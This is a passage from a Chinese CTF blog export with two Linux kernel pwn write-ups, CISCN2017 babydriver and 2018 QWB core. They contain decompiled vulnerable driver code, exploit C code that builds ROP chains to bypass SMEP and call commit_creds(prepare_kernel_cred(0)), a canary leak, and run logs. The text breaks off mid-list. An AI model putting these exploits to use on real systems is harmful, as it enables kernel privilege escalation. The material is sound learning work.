    <content><![CDATA[<h3 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br></pre></td></tr></table></figure>

<p>本文主要学习 Kernel bypass-smep 利用方式<br>题目以 CISCN2017 - babydrive 为例</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>本题主要开启了 SMEP 可以防止内核态访问用户空间代码</p>
<p>逆向伪代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret =  alloc_chrdev_region(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;babydev&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(ret &lt;<span class="number">0</span>)</span><br><span class="line">        printk(<span class="string">&quot;alloc chrdev region failed&quot;</span>)</span><br><span class="line">    cdev_init()</span><br><span class="line">    ret = cdev_add(babydev_no, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> ret &gt;= <span class="number">0</span></span><br><span class="line">        v5 = _class_create(<span class="string">&quot;babydev&quot;</span>, &amp;babydev_no)</span><br><span class="line">        <span class="keyword">if</span> (!v5)</span><br><span class="line">            printk(<span class="string">&quot;create class failed&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v7 = device_create(v5, <span class="number">0</span>, babydev_no, <span class="number">0</span>, <span class="string">&quot;babydev&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> !v7</span><br><span class="line">                printk(<span class="string">&quot;create devive failed&quot;</span>)</span><br><span class="line">                class_destroy(babydev_class)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        cdev_del()</span><br><span class="line">    printk(<span class="string">&quot;cdev init failed&quot;</span>)</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> babydriver_exit()</span><br><span class="line">&#123;</span><br><span class="line">    device_destroy(babydev_class, babydev_no);</span><br><span class="line">    class_destroy(babydev_class)</span><br><span class="line">    cdev_del(&amp;cdev_0);</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int64 <span class="title function_">babyioctl</span><span class="params">(file* filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> command == <span class="number">10001</span>h</span><br><span class="line">        kfree(babydev_strcut.device_buf);</span><br><span class="line">        device_buf = kmalloc(arg, <span class="number">0x24000C0</span>)</span><br><span class="line">        device_buf_len = arg</span><br><span class="line">        printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        printk(<span class="string">&quot;args:   &quot;</span>)</span><br><span class="line">        result = <span class="number">-22</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">babyopen</span><span class="params">(inode *inode, file* filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    babyddev_strcut.device_buf = kmalloc(<span class="number">0x24000C0</span>L, <span class="number">64LL</span>)</span><br><span class="line">    babydev_struct.device_buf_len = <span class="number">64</span></span><br><span class="line">    printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">babyrelease</span><span class="params">(inode *inode, file * filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    printk(<span class="string">&quot;device release\n&quot;</span>, filp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ssize_t</span> <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> (!babydev_struct.device_buf)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    result = <span class="number">-2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; length)</span><br><span class="line">        retVal = length</span><br><span class="line">        copy_to_user(buffer);</span><br><span class="line">        result = retVal;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!babydev_struct.device_buf)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    result = <span class="number">-2</span>;</span><br><span class="line">    <span class="keyword">if</span> (babydev_strcut.device_buf_len &gt; length)</span><br><span class="line">        retVal = length</span><br><span class="line">        copy_from_user();</span><br><span class="line">        result = retVal;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本题内核版本为 4.4.72，是能够通过直接劫持 cred 结构体进行解决，但是如果内核版本提升，就无法直接进行劫持，所以可以考虑绕过 smep 在进行 ROP 操作</p>
<p>主要绕过和ROP代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"><span class="type">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>) get_root;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>; <span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>; <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fake_tty_operations[i] = <span class="number">0xffffffff8181bfc5</span>; <span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>; <span class="comment">//pop rax; pop rbp; ret;</span></span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>) rop; </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>) fake_tty_operations;</span><br><span class="line">    write(fd2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//char buf[8] = &#123;0&#125;;</span></span><br><span class="line">    write(fd_tty, <span class="string">&quot;hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是从结果来看没有达到理想，运行结果如下</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">./exp1</span><br><span class="line">[*] Start to exploit...</span><br><span class="line">[*]status has been saved.</span><br><span class="line">[    5.575253] device open</span><br><span class="line">[    5.576199] device open</span><br><span class="line">[    5.577136] alloc done</span><br><span class="line">[    5.578029] device release</span><br><span class="line">[    5.579662] traps: exp1[91] general protection ip:40fbe6 sp:7ffc206211d8 error:0 in exp1[400000+b7000]</span><br><span class="line">[    5.582778] exp1[90]: segfault at 7ffc206213d0 ip 00007ffc206213d0 sp 00007ffc20621388 error 15</span><br><span class="line">[    5.585234] device release</span><br><span class="line">[    5.586091] bad magic number for tty struct (5:2) in tty_release</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
<p>通过调试知道在 swapgs 之后 pop rbp 会报错，但是至今没有找出来为什么会错</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF linux kernel pwn 0 之 Kernel ROP</title>
    <url>/2022/05/10/CTF-linux-kernel-pwn-0-%E4%B9%8B-Kernel-ROP/</url>
    <content><![CDATA[<span id="more"></span>

<h3 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br></pre></td></tr></table></figure>

<p>本文主要学习 Kernel ROP 利用方式<br>题目以 2018 强网杯 core 为例</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>获取题目解压后，查看文件信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// start.sh</span><br><span class="line">kaslr</span><br><span class="line"></span><br><span class="line">// bzImage </span><br><span class="line">kernel  version  = 4.15.8</span><br><span class="line"></span><br><span class="line">// core.cpio/init</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"></span><br><span class="line">// core.cpio/core.ko</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br></pre></td></tr></table></figure>

<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p><strong>init_module</strong><br>在 &#x2F;proc 目录下创建虚拟文件 core 以及虚拟文件对应的操作，0x1B6 即 0666, 表示为普通文件，操作权限 666</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">0x1B6</span>LL, <span class="number">0LL</span>, &amp;core_ops);</span><br><span class="line">	printk(<span class="string">&quot;create /proc/core entry&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>exit_module</strong><br>删除虚拟文件 core</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">exit_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (core_proc)</span><br><span class="line">		result = remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_release</strong><br>在文件删除时执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_release</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;core: release&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_write</strong><br>从用户空间复制不超过 0x800 字节的数据</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_write</span><span class="params">(<span class="type">int</span> a1, _user <span class="type">char</span> * buf, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;core: called core_writen&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, buf, len))</span><br><span class="line">        <span class="keyword">return</span> len;</span><br><span class="line">    printk(<span class="string">&quot;core: error copying data from userspacen&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>core_read</strong><br>从 v5[off] 拷贝 64 字节数据到用户空间</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">    printk(<span class="string">&quot;core: called core_read&quot;</span>);</span><br><span class="line">    printk(<span class="string">&quot;%d %p&quot;</span>);</span><br><span class="line">    result = copy_to_user(v1, (<span class="type">char</span> *)&amp;v5 + off, <span class="number">64LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_copy_func</strong><br>复制函数，从 name 复制数据到 v2</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">signed</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    v3 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">    printk(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (a1 &gt; <span class="number">63</span>)</span><br><span class="line">        printk(<span class="string">&quot;Detect Overflow&quot;</span>)</span><br><span class="line">        result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">        qmemcpy(&amp;v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_ioctl</strong><br>ioctl实现三个功能</p>
<ul>
<li>从内核空间复制信息到用户空间 read</li>
<li>从全局变量 name 复制内容到栈不超过 64 字节</li>
<li>修改全局偏移信息 off<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_ioctl</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> cmd, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">switch</span> cmd</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">			core_read(a3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">			printk(<span class="string">&quot;core %d&quot;</span>, );</span><br><span class="line">			off = a3;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">			printk(<span class="string">&quot;core: called core copy&quot;</span>);</span><br><span class="line">			core_copy_func(a3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>泄漏 Canary</li>
<li>构造ROP链</li>
<li>布置ROP链</li>
</ol>
<p><strong>泄漏 Canary</strong><br>首先通过 core_read 和 off 泄漏 canary</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] read to buf\n&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *) buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p&quot;</span>, canary);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ $ ./exp</span><br><span class="line">[*] <span class="built_in">set</span> off to 64</span><br><span class="line">[*] <span class="built_in">read</span> to buf</span><br><span class="line">[*] canary: 0xbb6f283435b8c000</span><br></pre></td></tr></table></figure>

<p><strong>构造初始ROP链</strong><br>ROP链需要通过 gadget 返回执行 <code>commit_cred(prepare_kernel_creds(0))</code></p>
<ul>
<li>如何获取 <code>commit_cred()</code> <code>prepare_kernel_cred()</code> 函数地址<br>本题中将虽然开启了 kptr，但是启动过程中将 <code>/proc/kallsyms</code> 复制到 <code>/tmp/kallsyms</code> 可以直接进行读取</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">21</span> <span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="number">22</span> </span><br><span class="line"><span class="number">23</span> <span class="type">size_t</span> <span class="title function_">find_func</span><span class="params">()</span></span><br><span class="line">24 &#123;</span><br><span class="line"><span class="number">25</span>         FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="number">26</span>         <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">27</span>         &#123;</span><br><span class="line"><span class="number">28</span>                 <span class="built_in">printf</span>(<span class="string">&quot;[*] open kallsyms error!\n&quot;</span>);</span><br><span class="line"><span class="number">29</span>                 <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">30</span>         &#125;</span><br><span class="line"><span class="number">31</span> </span><br><span class="line"><span class="number">32</span>         <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">33</span>         <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line"><span class="number">34</span>         &#123;</span><br><span class="line"><span class="number">35</span>                 <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line"><span class="number">36</span>                         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">37</span> </span><br><span class="line"><span class="number">38</span>                 <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line"><span class="number">39</span>                 &#123;</span><br><span class="line"><span class="number">40</span>                         <span class="type">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">41</span>                         <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line"><span class="number">42</span>                         <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line"><span class="number">43</span>                         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line"><span class="number">44</span>                 &#125;</span><br><span class="line"><span class="number">45</span> </span><br><span class="line"><span class="number">46</span>                 <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cr    ed)</span><br><span class="line"><span class="number">47</span>                 &#123;</span><br><span class="line"><span class="number">48</span>                         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">49</span>                         <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line"><span class="number">50</span>                         <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line"><span class="number">51</span>                         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_ker    nel_cred);</span><br><span class="line"><span class="number">52</span>                 &#125;</span><br><span class="line"><span class="number">53</span>         &#125;</span><br><span class="line"><span class="number">54</span> </span><br><span class="line"><span class="number">55</span>         <span class="keyword">if</span> (!(commit_creds &amp; prepare_kernel_cred))</span><br><span class="line"><span class="number">56</span>         &#123;</span><br><span class="line"><span class="number">57</span>                 <span class="built_in">printf</span>(<span class="string">&quot;[*] Error!&quot;</span>);</span><br><span class="line"><span class="number">58</span>                 <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">59</span>         &#125;</span><br><span class="line"><span class="number">60</span> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>如何获取 gadget<br>  可以使用 ropper 直接保存所有 gadget<br>  ropper –file .&#x2F;vmlinux –nocolor &gt; g1<br>  ROPgadget –binary .&#x2F;vmlinux &gt; g2</p>
</li>
<li><p>如何获取 gadget 地址<br>  开启 kaslr 后内核加载地址将会变化，但是加载偏移不会变化</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ # cat /proc/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffff9129cce0 T prepare_kernel_cred</span><br><span class="line">/ # cat /proc/kallsyms | grep commit_creds</span><br><span class="line">ffffffff9129c8e0 T commit_creds</span><br><span class="line">prepare_kernel_cred - commit_creds = 0x400</span><br><span class="line"></span><br><span class="line">/ # cat /proc/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffffa009cce0 T prepare_kernel_cred</span><br><span class="line">/ # cat /proc/kallsyms | grep commit_creds</span><br><span class="line">ffffffffa009c8e0 T commit_creds</span><br><span class="line">prepare_kernel_cred - commit_creds = 0x400</span><br></pre></td></tr></table></figure></li>
</ul>
<p>查看内核函数的偏移，通过偏移可以计算出 gadget 的位置<br>已知 函数偏移 函数地址<br>    <code>vmlinux base = 函数地址 - 函数偏移</code><br>已知 无偏移 gadget 地址<br><code>真正的 gadget = 原有 gadget - 原有 vmlinux base + 真实 vmlinux base</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec vmlinux</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; vmlinux = ELF(<span class="string">&quot;./vmlinux&quot;</span>)</span></span><br><span class="line">[*] &#x27;/home/embeded/Desktop/core/give_to_player/core/vmlinux&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    Version:  4.15.8</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; hex(vmlinux.sym[<span class="string">&#x27;commit_creds&#x27;</span>] - 0xffffffff81000000)</span></span><br><span class="line">&#x27;0x9c8e0&#x27;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>执行完 commit_creds(prepare_kernel_cred(0)) 后该怎么办？<br>  返回用户态进行调用</p>
<ul>
<li>为什么要返回用户态<ul>
<li>大部分有用的信息能都在用户态更易获取</li>
<li>内核台不容易办到<ul>
<li>修改文件系统</li>
<li>创建新进程</li>
<li>创建网络连接</li>
</ul>
</li>
</ul>
</li>
<li>如何返回用户态<br>  判断是否属于用户态，一般通过特殊的寄存器指令 <code>swapgs; iretq</code> 需要设置 <code>cs</code> <code>rflags</code> 等信息，函数保存 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="keyword">asm</span>(</span><br><span class="line">         <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">         <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">         <span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">         <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">         <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">         :<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line">         :</span><br><span class="line">         : <span class="string">&quot;memory&quot;</span></span><br><span class="line">     );</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>确认 rop 链</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">|......| &lt;- rsp </span><br><span class="line">|......| </span><br><span class="line">|......| &lt;- rsp + 0x40</span><br><span class="line">|canary|</span><br><span class="line">|gadget 1| &lt;- ret &lt;- pop rdi, ret</span><br><span class="line">|    0   |</span><br><span class="line">|prepare_kernel_cred| -&gt; return rax</span><br><span class="line"></span><br><span class="line">|gadget 2| &lt;- mov rdi, rax, ret</span><br><span class="line">|commit_creds|</span><br><span class="line"></span><br><span class="line">|gadget 3| &lt;- swapgs; ret;</span><br><span class="line">|gadget 3| &lt;- iretq; ret;</span><br><span class="line">|shell addr|</span><br><span class="line">|cs|</span><br><span class="line">|user_rflags|</span><br><span class="line">|user_sp|</span><br><span class="line">|user_ss|</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<ol>
<li>首先填充满已知区域，配置 Canary</li>
